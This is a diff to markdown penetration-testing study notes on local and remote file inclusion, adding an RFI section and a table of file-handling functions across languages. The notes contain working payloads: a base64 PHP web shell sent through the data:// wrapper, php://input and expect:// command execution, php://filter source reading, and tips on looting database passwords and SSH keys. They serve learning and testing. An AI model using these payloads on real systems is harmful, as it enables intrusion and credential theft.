@@ -1,6 +1,6 @@
 ### Content
 * [[#Overview]]
-* [[#Local file inclusion]]
+* [[#Local file inclusion]] (LFI)
 	* Path Traversal
 	* Second-Order Attacks
 * [[#Bypasses Techniques]]
@@ -15,8 +15,8 @@
 * From LFI to RCE
 	* PHP Wrappers
 		* Data / Input / Expect
-	* Remote File Inclusion
-* [[#Examples of Vulnerable Code and FI Functions]]
+	* [[#Remote File Inclusion]] (RFI)
+* [[#Read, Write and Execute Functions]]
 ---
 ## Overview
 - **Types of File Inclusion**:
@@ -97,7 +97,7 @@ If we were not sure of the directory the web application is in, we can add `../`
 		configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 69ms]
 		```
 	2.  We should use the payload `configure`: `www.example.com/index.php?lang=configure`
-		1. If the web app uses a #read_write_functions  that executes the content of the file, it won't show the file content.
+		1. If the web app uses a [[#Read, Write and Execute Functions]] that executes the content of the file, it won't show the file content.
 		2. Using PHP wrapper with convert filter to encode the content of the file so it doesn't get executed
 		   `www.example.com/index.php?lang=php://filter/read=convert.base64-encode/resource=config`
 		3. Decode the output
@@ -106,10 +106,11 @@ If we were not sure of the directory the web application is in, we can add `../`
 			```
 ---
 ## From LCI to RCE
-- Search for DB password in `config.php`
-- Check `.ssh` directory on each user home directory for their private keys `id_rsa`
-- PHP:
-	- [Data](https://www.php.net/manual/en/wrappers.data.php) wrapper attack
+> [!Note]
+> Search for DB password in `config.php` and check for password reuse.
+> Check `.ssh` directory on each user home directory for their private keys `id_rsa`.
+- **PHP wrappers**:
+	- [Data](https://www.php.net/manual/en/wrappers.data.php)
 		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
 			- `/etc/php/X.Y/apache2/php.ini` for Apache (`X.Y` is the PHP version installed) 
 			- `/etc/php/X.Y/fpm/php.ini` for Nginx
@@ -124,7 +125,7 @@ If we were not sure of the directory the web application is in, we can add `../`
 				PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 				curl -s 'http://URL/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep id
 				```
-	- [Input](https://www.php.net/manual/en/wrappers.php.php) wrapper attack.
+	- [Input](https://www.php.net/manual/en/wrappers.php.php)
 		- Check PHP configurations to see if (`allow_url_include`) setting is enabled.
 		- Send the payload as a POST parameter, so the vulnerable parameter must accept POST request.
 			``` bash
@@ -132,16 +133,42 @@ If we were not sure of the directory the web application is in, we can add `../`
 			# If the vulnerable function doesn't accept GET parameters, hardcode the command directly in the payload
 			curl -s -X POST --data '<?php system("id"); ?>' "http://URL/index.php?language=php://input"
 			```
-	- [Expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper attack. 
+	- [Expect](https://www.php.net/manual/en/wrappers.expect.php)
 		- Expect wrapper is an external wrapper so it has to be installed and enabled manually.
 		- Check PHP configurations like above but `grep expect`, we would get `extension=expect` as result if it's there.
 		- Use expect module to gain RCE
 			``` bash
 			curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 			```
+- **Remote File Inclusion**:
+	- Any RFI vulnerability is also an LFI vulnerability, but an LFI may not necessarily be an RFI. Check [[#Read, Write and Execute Functions]]
+	- Remote URL inclusion in `PHP` require the `allow_url_include` setting to be enabled.
+	- 
 ---
-## Examples of Vulnerable Code and FI Functions
-The following code snippets show if a site taking a `GET` parameter `?language=en` directly from a user without sanitization or filtration :
+## Read, Write and Execute Functions
+
+| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
+| ---------------------------- | :--------------: | :---------: | :------------: |
+| **PHP**                      |                  |             |                |
+| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
+| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
+| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
+| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
+| **NodeJS**                   |                  |             |                |
+| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
+| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
+| `res.render()` Express.js    |        ✅         |      ✅      |       ❌        |
+| **Java**                     |                  |             |                |
+| `include`                    |        ✅         |      ❌      |       ❌        |
+| `import`                     |        ✅         |      ✅      |       ✅        |
+| **.NET**                     |                  |             |                |
+| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
+| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
+| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
+| `include`                    |        ✅         |      ✅      |       ✅        |
+
+#### Examples 
+If the web application takes a `GET` parameter `?language=en` as input without sanitization or filtration :
 - PHP, we may use these functions to load a local or a remote file as we load a page:
 	``` PHP
 	if (isset($_GET['language'])) { include($_GET['language']); }
@@ -178,27 +205,4 @@ The following code snippets show if a site taking a `GET` parameter `?language=e
 	// Render local files or remote URLs
 	<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
 	```
-
-The following table shows #read_write_functions which may also execute files:
-
-| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
-| ---------------------------- | :--------------: | :---------: | :------------: |
-| **PHP**                      |                  |             |                |
-| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
-| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
-| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
-| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
-| **NodeJS**                   |                  |             |                |
-| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
-| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
-| `res.render()` Express.js    |        ✅         |      ✅      |       ❌        |
-| **Java**                     |                  |             |                |
-| `include`                    |        ✅         |      ❌      |       ❌        |
-| `import`                     |        ✅         |      ✅      |       ✅        |
-| **.NET**                     |                  |             |                |
-| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
-| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
-| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
-| `include`                    |        ✅         |      ✅      |       ✅        |
-
 ---
